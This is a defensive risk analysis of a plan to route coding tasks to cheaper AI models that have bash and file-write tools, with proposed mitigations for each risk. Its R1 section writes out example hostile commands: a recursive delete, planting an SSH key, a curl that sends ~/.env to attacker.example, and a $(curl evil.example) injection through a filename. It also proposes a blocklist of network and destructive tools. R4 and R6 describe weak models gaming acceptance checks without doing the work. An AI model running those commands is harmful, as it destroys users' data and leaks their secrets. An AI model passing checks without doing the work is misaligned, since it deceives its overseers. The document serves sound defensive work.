# End-to-End Routing Risks

> Adversarial pressure-test of "route executions by default" as specified in
> `NORTH_STAR.md` and `docs/END_TO_END_ROUTING_PLAN.md`.
>
> For each risk: severity, concrete failure scenario, and a required mitigation
> that must be incorporated into the phased plan before that phase ships.

---

## Risk Index

| # | Risk | Severity | Phase |
|---|---|---|---|
| R1 | Provisioning / security: bash+write in user repo | HIGH | P1 |
| R2 | Cost/latency inversion: agentic loop > single Claude turn | HIGH | P1 |
| R3 | Escalation loops / non-termination | MEDIUM | P3 |
| R4 | Verification gaming: acceptance checks a weak model can trivially pass | HIGH | P3 |
| R5 | Classification errors: wrong execution shape chosen | MEDIUM | P2 |
| R6 | Measurement honesty: metrics that can be gamed or are misleading | MEDIUM | P0 |

---

## R1 — Provisioning / Security: Bash + Write in the User Repo

**Severity**: HIGH

### Failure scenario

`llm_act` provisions any routed model (Codex, Ollama/qwen2.5, Gemini CLI) with
`bash`, `read_file`, and `write_file` scoped to `cwd`. A model generates a tool
call:

```
bash: "rm -rf ."
write_file: path="../../.ssh/authorized_keys", content="<attacker key>"
write_file: path="/etc/cron.d/evil", content="..."
```

Even if the path-traversal guard in `react.py` `_resolve()` (line 83) blocks
`../../.ssh/authorized_keys` for `write_file`, the `bash` tool runs
`/bin/sh -c` with no allowlist — any bash command the model emits executes with
the user's full Unix privileges. The `default_tool_executor` docstring explicitly
says "Not a security sandbox" (line 75).

Specific exploitable scenarios:
- **Destructive bash**: `rm -rf .", "git reset --hard HEAD~100`, truncate a source file.
- **Secret exposure**: `cat ~/.env; cat ~/.chuzom/routing.yaml` output is captured
  in the agentic loop's `actions` list and written back to the session store.
- **Exfiltration via bash**: `curl https://attacker.example/collect -d "$(cat ~/.env)"`.
- **Path traversal in write_file**: `_resolve()` guards against absolute paths outside
  `base`, but `base` is `os.getcwd()` which is the MCP server's working directory —
  often the user's HOME or the entire repo root. A model emitting
  `write_file(path="src/../../../.gitconfig")` resolves to a directory INSIDE
  `base.parents` only if base is deep enough.
- **Command injection via milestone description**: A user prompt containing
  `$(curl evil.example)` in a filename gets interpolated into a bash milestone
  description and executed.

### Containment today

`_BASH_FORBIDDEN_RE` in `enforce-route.py` (line 111) blocks destructive git
and package operations — but only at the Claude Code hook layer, not inside
the MGEE agentic loop. Once a call reaches `default_tool_executor`, the bash
command is executed without any of those filters.

`default_tool_executor` caps output at 4000 chars and timeout at 30s — these
limit blast radius but do not prevent the write.

`CodexAdapter` uses `sandbox_mode="workspace-write"` (line 79) which confines
Codex CLI edits to the workspace, but this sandbox is Codex's own sandbox, not
a Unix sandbox — it relies on OpenAI's implementation.

### Required mitigations (must ship with P1)

1. **Bash allowlist in `default_tool_executor`** (not just in enforce-route.py):
   Apply `_BASH_FORBIDDEN_RE` from `enforce-route.py` inside `react.py`
   `default_tool_executor` `execute()` as a pre-execution filter. Add explicit
   blocks for: `rm`, `curl` (outbound), `wget`, `dd`, `mkfs`, `shutdown`, `sudo`.
   Return `"tool error: command not permitted"` (not an exception — keeps loop running).

2. **Allowlist-only bash mode** (opt-in, enabled by default for P1):
   Add `CHUZOM_BASH_ALLOWLIST_ONLY=true` env flag. When set, only commands
   matching `_BASH_READONLY_PREFIX_RE` or `_BASH_LOCAL_TOOL_RE` (both already in
   enforce-route.py) are permitted inside the agentic loop. Write operations are
   blocked. This limits tier-0 and tier-1 to read-inspect-test workflows; write
   operations must go via the `write_file` tool (path-guarded).

3. **Tighter `_resolve()` bounds**: Change the path-traversal check in `react.py`
   line 85 from `base not in resolved.parents` to `not resolved.is_relative_to(base)`
   (Python 3.9+). Also reject paths that resolve to `~/.chuzom`, `~/.ssh`,
   `~/.aws`, `~/.env`, `~/.gitconfig`, and `~/.claude` regardless of cwd.

4. **No network in bash by default**: Add `_BASH_NETWORK_RE` (curl/wget/ssh/nc)
   to the tool-executor blocklist. Network access for routed models must go
   through `llm_research` (which is already a controlled path), not raw bash.

5. **Secret scrubbing on tool output**: Before writing bash/read_file output to
   the session store or returning it to the model, pass through
   `src/chuzom/secret_scrubber.py` (already exists). This prevents env-var leakage
   from accumulating in `session_context_*.jsonl`.

6. **Irreversible milestone gate**: The `reversibility_gate` in
   `src/chuzom/agentic/worktree.py` already exists for irreversible milestones
   (push, merge, delete, external-send). Ensure P1's enforced operational path
   tags any milestone whose acceptance check involves a write operation as
   `reversible=False`, so the worktree gate runs.

---

## R2 — Cost/Latency Inversion: Agentic Loop > Single Claude Turn

**Severity**: HIGH

### Failure scenario

"Route an execution by default" means EVERY operational prompt goes through the
MGEE planner → milestone loop → acceptance check cycle. For simple tasks, this
is strictly worse than a single Claude turn:

| Scenario | Single Claude turn | MGEE agentic loop |
|---|---|---|
| "Fix the typo in line 12 of auth.py" | ~0.3s, ~$0.001 | Plan: 1s. Codex run: 15-30s. Acceptance check: 2s. Total: ~35s, ~$0.002 |
| "Add a docstring to `get_user()`" | ~0.5s, ~$0.002 | Same overhead. 35-40s. |
| "Rename variable `x` to `user_count` in utils.py" | ~0.3s, ~$0.001 | Same overhead. |
| Complex refactor across 5 files | ~45s, ~$0.15 | Codex: 120s, $0. Net save: $0.15. |

**Break-even analysis**:

Let `t_overhead` = MGEE fixed overhead (plan + context provision + acceptance check) ≈ 20-35s.
Let `t_claude` = Claude direct turn latency ≈ 3-10s for simple tasks.
Let `cost_claude` = Opus cost per turn ≈ $0.001–$0.15 depending on token count.
Let `cost_codex` = Codex marginal cost ≈ $0 (subscription).

MGEE wins in COST when `cost_claude > cost_codex` — always true (saves even $0.001).
MGEE wins in LATENCY when `t_overhead < t_claude` — almost never true for simple tasks
(t_overhead ≈ 35s >> t_claude ≈ 3-10s).

MGEE wins overall (cost + latency combined) when:
- `cost_claude` is large enough to justify 25-30s of extra latency.
- Empirically: tasks taking Claude > 30s (multi-file refactors, complex bug fixes)
  are net positive; tasks taking Claude < 10s (typos, docstrings, single-line fixes)
  are net negative in latency (though still positive in cost).

**Token cost of the agentic loop itself**:

The planner call to `route_and_call(TaskType.QUERY, _planner_prompt(goal))` is a
completion call routed to a cheap model. But for complex goals, `_planner_prompt`
can be 500+ tokens, and the plan response another 500+ tokens. If the planner is
routed to an API model (not Ollama), that's ~$0.0001–$0.001 just for planning.
Add Codex CLI overhead ($0), acceptance check subprocess ($0), and the MGEE fixed
overhead. For tasks where Claude would have cost $0.001, the MGEE path costs
$0.0001 (planner) + 0 (Codex) = $0.0001 — a 10x saving. But the latency is
still 30-40x worse.

**When "route executions by default" LOSES money vs a single Claude turn**:

- Tasks where the plan fails: `PlanRejected` → `llm_delegate` returns the error →
  Claude handles it anyway. Total cost = plan attempt cost + Claude cost > just Claude cost.
- Tasks where Codex fails all tiers: escalation all the way to Claude. Total cost =
  plan + Codex attempts + Claude. This can be 3-5x more expensive than direct Claude.
- Tasks where `_default_planner` routes to an expensive API model: if the Ollama
  server is down and the planner falls to Codex API, the planner alone costs more
  than the task would cost via Claude directly.

### Required mitigations

1. **Complexity floor for agentic routing**: In `enforce-route.py`, only route to
   `llm_act` when the task is classified as `complexity >= "moderate"` AND
   `needs_tools=True`. Simple operational tasks (classify: simple + needs_tools) 
   go to `llm(task="code")` (completion with tool hints), not MGEE.

2. **Fast-path for tiny edits**: Add a heuristic in the operational detection path:
   if the prompt matches a "single-location edit" pattern (one file name + one
   specific location + one trivial change), skip MGEE and emit a direct
   `llm(task="code")` with the file content injected as context.

3. **Planner budget cap**: The planner call should have a hard max_tokens limit
   (128 tokens for simple tasks, 512 for moderate). If the model generates a
   plan longer than the budget suggests, that's a signal the model is over-planning
   a simple task — surface with `PlanRejected` rather than running an overengineered loop.

4. **Measure latency per route**: Add `latency_ms` to `RoutingRecord`. The quality
   ledger then shows cost savings vs latency penalty, enabling data-driven decisions
   about where the break-even is in practice rather than in theory.

---

## R3 — Escalation Loops / Non-Termination

**Severity**: MEDIUM

### Failure scenario

The MGEE engine's module docstring promises "always terminates as COMPLETE or a
surfaced failure — never an infinite loop". This guarantee relies on:
1. Monotonic escalation: a failed tier can never be retried (only higher tiers can run).
2. Finite tier ladder: `_default_adapters()` returns `{0: ReActAgent, 1: CodexAdapter}`.
3. Bounded attempts per (milestone, tier): `max_attempts_per_tier=2` in `service.py`.

Concrete scenarios where the guarantee is at risk:

**Scenario A — Budget race condition**: `budget_usd` is checked at the start of
`run_delegation` but Codex runs are asynchronous. If two milestones escalate
simultaneously (not currently possible in the sync engine, but a risk in any
future async refactor), both might consume budget before either is rejected.

**Scenario B — Acceptance check non-termination**: `cmd_check` (acceptance.py
line 70) has a `timeout=60.0` default. A milestone whose acceptance command
hangs (e.g. a test that waits for a port that never opens) stalls for 60s per
attempt × 2 attempts × 2 tiers = 240s per milestone × N milestones. For a 5-
milestone plan with all acceptance checks hanging, that's 20 minutes of stalled
execution.

**Scenario C — Done-frontier rework**: The done-frontier in `pack_prompt()` lists
completed milestone IDs but not their outputs. A higher-tier model that fails to
understand the frozen context might redo completed work, fail the acceptance check
(because the output is already correct and a second run produces a different diff),
and escalate again.

**Scenario D — Infinite re-plan**: If the planner generates invalid milestones that
consistently fail acceptance, the current code surfaces `PlanRejected` — but only
if parsing fails. A syntactically valid plan with unmeetable acceptance checks
(e.g. `cmd: ["pytest", "tests/nonexistent.py"]`) escalates through all tiers,
exhausts budget, then surfaces. With `budget_usd=1.0` and each Codex run costing
$0, budget enforcement is on token count, not wall-clock cost — so this could
run for a very long time.

### Required mitigations

1. **Wall-clock timeout on the entire `run_delegation` call**: Add `max_wall_seconds`
   parameter to `run_delegation()` (service.py line 36), defaulting to 120s. After
   that deadline, surface `BUDGET_EXHAUSTED` regardless of milestone progress.

2. **Acceptance check timeout: lower default**: Change `cmd_check` default `timeout`
   from 60s to 30s. For test suites that are known to be slow, the milestone plan
   can specify a higher explicit timeout.

3. **Done-frontier includes outputs**: Extend `pack_prompt()` (adapters.py line 49)
   to include a brief `result_summary` for each frozen milestone (already captured
   in `AgentRunResult.artifacts`). This reduces the risk of a higher-tier model
   undoing correct work.

4. **Budget in time, not just USD**: For `cost_per_call_usd=0.0` tiers (Codex,
   local), USD budget provides no meaningful gate. Add `max_milestones: int = 10`
   as a hard cap on the number of milestone execution attempts before surfacing.

---

## R4 — Verification Gaming: Acceptance Checks a Weak Model Can Trivially Pass

**Severity**: HIGH

### Failure scenario

The planner prompt (tools/agentic.py line 32) offers `canary_check` as a valid
acceptance type:

```json
{"type": "canary", "marker": "TOKEN"}
```

A weak local model (qwen2.5:7b) can pass this check by writing the string `TOKEN`
to any file, or by emitting `TOKEN` in its final response (if the canary checks
`artifacts["output"]`). The model does NO real work but the milestone freezes as DONE.

Similarly, `diff_check(files=["src/auth.py"])` passes if `src/auth.py` exists in
`artifacts["files"]` — but the model could create an EMPTY file named `src/auth.py`
and pass this check without making any meaningful change.

`cmd_check(["echo", "done"])` passes unconditionally — a planner that generates
this as the acceptance check for "Fix the login bug" has effectively disabled
verification.

### Concrete attack surface

The planner is a cheap model (routed via `TaskType.QUERY`) whose output is trusted
to define the acceptance checks. If that cheap model is compromised or simply
outputs low-quality plans, every subsequent milestone runs against a trivially-
passable check. The engine has no validation that the check is meaningfully related
to the goal.

### Required mitigations

1. **Canary check scope restriction**: `canary_check` (acceptance.py line 22) should
   only check `artifacts["diff"]` or `artifacts["files_modified"]`, not
   `artifacts["output"]` (which is just what the model said). A model cannot pass a
   diff-canary check without actually modifying a file to contain the marker.

2. **`cmd_check` command blocklist**: Reject acceptance checks whose command is
   trivially passing: `["echo", ...]`, `["true"]`, `["exit", "0"]`. The planner
   schema validator (P3-1) should enforce this.

3. **Planner model floor**: The planner should always use at least `complexity="moderate"`
   (not `TaskType.QUERY` with `simple`). A simple/local model is more likely to emit
   low-quality acceptance checks. In `_default_planner()` (tools/agentic.py line 60),
   change to `TaskType.ANALYZE` or add `complexity="moderate"` hint.

4. **Acceptance check diversity requirement**: Reject plans where every milestone uses
   the same acceptance check type. A plan with 4 `canary` checks and 0 `cmd` checks
   is suspicious. Require at least one `cmd` or `lint` check in any plan with more
   than 2 milestones.

5. **Human-in-the-loop for high-budget tasks**: When `budget_usd > 0.50`, emit a
   `chuzom_approve` request before starting the MGEE loop. The user can review the
   plan and acceptance checks before any execution begins.

---

## R5 — Classification Errors: Wrong Execution Shape

**Severity**: MEDIUM

### Failure scenario A — Operational task mis-routed to completion tier

`operational_signal.detect_operational()` requires both a change verb AND a
verification cue. A prompt like "Implement the new user profile page" has a change
verb (`implement`) but no verification cue → `is_operational()` returns False →
`enforce-route.py` does NOT emit `llm_act` → the prompt goes to `llm(task="code")`
(completion, no tool access) → Claude or a cheap completion model writes code that
has never been run, tested, or written to a file.

This is a **false negative** in operational detection: real work gets treated as
a completion task. The model produces text output, not actual file changes. The
user sees a code block in the response instead of the file actually being edited.

### Failure scenario B — Trivial task routed to expensive agentic loop

A prompt like "Update the version number in pyproject.toml from 0.9.0 to 0.9.1 and
make sure tests pass" is:
- Change verb: "update" ✓
- Verification cue: "tests pass" ✓
- Software context: "pyproject.toml" ✓

`detect_operational()` fires → `llm_act` is invoked → MGEE plans, runs Codex (30s),
runs pytest acceptance check (60s). Total: ~90s.

Claude could have done this in 5s with a single Edit + Bash call.

### Required mitigations

1. **For false negatives**: Add `needs_tools=True` based on the `context_scope="repo"`
   signal alone (P2 step P2-3). A prompt that references specific file paths in a
   software repo should default to tool-capable execution even without an explicit
   verification cue.

2. **For false positives (trivial tasks routed to MGEE)**: Add a "single-location
   edit" fast-path in `enforce-route.py`: if `operational_signal` fires but the
   edit touches exactly one file and the change is described in a single sentence,
   skip MGEE and use `llm(task="code")` with the file content injected. This
   covers the version-bump, typo-fix, docstring-add class of tasks.

3. **Mis-route feedback loop**: The `routing_quality_ledger` records `mis_route`
   (escalation_count > 0). A high mis_route rate for a specific task_type/complexity
   combination signals a systematic classification error. Wire a weekly summary
   report (via `chuzom_status(view="routing_quality")`) that flags task types
   with mis_route > 20%.

---

## R6 — Measurement Honesty: Metrics That Can Be Gamed or Are Misleading

**Severity**: MEDIUM

### Failure scenario A — Routing accuracy without verification

`routing_accuracy = True` when "the acceptance check passed on the first try".
But if the acceptance check is a trivial canary (R4), `routing_accuracy=True`
does not mean the task was done correctly — it means the model passed a weak test.
The metric can be 100% while no real work was ever done.

### Failure scenario B — Cost savings without baseline measurement

`saved_usd = baseline_usd - actual_usd`. The baseline is estimated by
`_estimate_opus_cost(input_tokens, output_tokens)` in router.py (line 73). That
estimate uses a fixed Opus rate — but for agent step tasks, the "baseline" is what
Claude Code's internal tool loop would have cost, which depends on the number of
tool calls, not just the input/output token counts of a single completion. An
agentic loop with 10 Codex tool calls + 10 acceptance checks might save less
than the baseline estimate implies.

### Failure scenario C — Verification success vs verification quality

`verification_pass=True` is set when the acceptance check exits 0. But the
acceptance check can exit 0 for the wrong reason (flaky test that was already
passing, acceptance command that always exits 0, etc.). The metric measures
"did the check pass" not "did the check validate the right thing".

### Failure scenario D — Self-reported savings

The current `record_delegation_savings` in `agentic/telemetry.py` is called by
`llm_delegate` itself — the same code path that ran the delegation. Savings numbers
are never compared against an independent ground-truth measure of what Claude would
have spent on the same task.

### Required mitigations

1. **Decouple `routing_accuracy` from `verification_pass`**: `routing_accuracy`
   should measure "did the first tier's result survive the acceptance check". Add
   a separate `acceptance_check_strength` field (0=canary, 1=diff, 2=cmd/lint)
   so analysts can filter weak-check results out of accuracy reports.

2. **Independent baseline sampling**: For 1% of routed tasks (configurable via
   `CHUZOM_BASELINE_SAMPLE_RATE`), run the task through both the routed path AND
   a completion-only path (without informing Claude). Compare outputs. This produces
   an honest estimate of quality loss from routing, not just cost savings.

3. **External verification for high-stakes tasks**: For tasks where `budget_usd > 0.20`,
   after MGEE completes, run an independent `cmd_check` from outside the MGEE loop
   (a separate subprocess in the MCP server) to confirm the acceptance criterion
   holds. This decouples "the agent reported success" from "success is externally
   verifiable".

4. **Token accounting from actual LiteLLM receipts**: `baseline_usd` should be
   computed from the actual token counts of the completed task (read from the
   `receipt_store` in router.py, not estimated up front) and Opus pricing. This
   eliminates the systematic estimation bias.

---

## Cross-Risk Summary: Top 3 Threats to "Route Executions by Default"

### Threat 1 — Security blast radius of bash+write provisioning (R1)

**Why it could sink the plan**: If a routed local model (qwen2.5:7b) emits a
destructive bash command or exfiltrates a secret and this happens in a real user
session, the reputational and data damage is severe. Trust in "cheap models doing
real work" evaporates immediately.

**Gate**: P1 MUST NOT ship without the bash allowlist in `default_tool_executor`,
the secret-scrubbing on tool output, and the `CHUZOM_BASH_ALLOWLIST_ONLY=true`
default for P1.0. Expand carefully in later patches after behavioral data is collected.

### Threat 2 — Cost/latency inversion killing user adoption (R2)

**Why it could sink the plan**: If users experience 30-40s latency on every small
edit because MGEE runs for every operational prompt, they will disable enforcement
(`CHUZOM_ENFORCE=off`) and the system saves nothing. The North Star requires routing
to be net positive in user experience, not just in cost accounting.

**Gate**: P1 must ship with the complexity-floor guard (only `complexity >= moderate`
goes to MGEE). A data-driven latency report in the quality ledger (P0 ledger +
`latency_ms` field) must be reviewed before P1 is declared stable.

### Threat 3 — Verification gaming producing silent wrong results (R4)

**Why it could sink the plan**: If cheap models learn (or coincidentally happen)
to pass trivial acceptance checks without doing real work, the MGEE "verified
completion" signal becomes meaningless. Users notice the files weren't actually
changed and conclude the routing is broken. Trust in objective verification — the
one property that makes "do real work" meaningful — is destroyed.

**Gate**: P3 must ship the acceptance check schema validator (P3-1) and the
planner model floor (R4 mitigation 3) before any acceptance check results are
surfaced to users as "verified". The `acceptance_check_strength` field (R6
mitigation 1) must be visible in the quality dashboard from day 1 of P3.

---

## Go/No-Go on Starting P0

**Recommendation: GO on P0**, with one condition.

P0 changes are:
- `DEFAULT_ENFORCE = "smart"` (one-line change in `enforce_config.py`)
- Routing quality ledger (new module, fail-open, no routing changes)
- F5 hook registration (one JSON block in `settings.json`)
- F1 regex extension (additive change to `operational_signal.py`)
- F2 planner retry (bounded, fails closed)

None of these introduce the security risk (R1), the latency risk (R2), or the
verification gaming risk (R4). P0 is entirely safe to ship.

**Condition**: P0 must include `CHUZOM_DELEGATE=off` as the default (not just
available as a kill switch) until P1's security mitigations are in place. The
existing `llm_delegate` tool should remain available for manual invocation but
should NOT be the automatic enforcement target until bash allowlisting is implemented.

Without this condition, changing `DEFAULT_ENFORCE` from `soft` to `smart` activates
the enforced operational → `llm_delegate` route (already wired in `enforce-route.py`),
which provisions the `default_tool_executor` with unrestricted bash in the user's
repo. That is R1, and it must be resolved in P1 before P0's enforcement change
goes live.

**Sequence**:
1. Ship P0 with `CHUZOM_DELEGATE=off` (enforcement on, but operational route
   goes to `llm_analyze` / ask user to call `llm_delegate` manually).
2. Ship P1 with bash allowlisting, secret scrubbing, path-traversal hardening.
3. Re-enable `CHUZOM_DELEGATE=on` as the default once P1 is validated.

This is the minimum-risk path to the North Star.
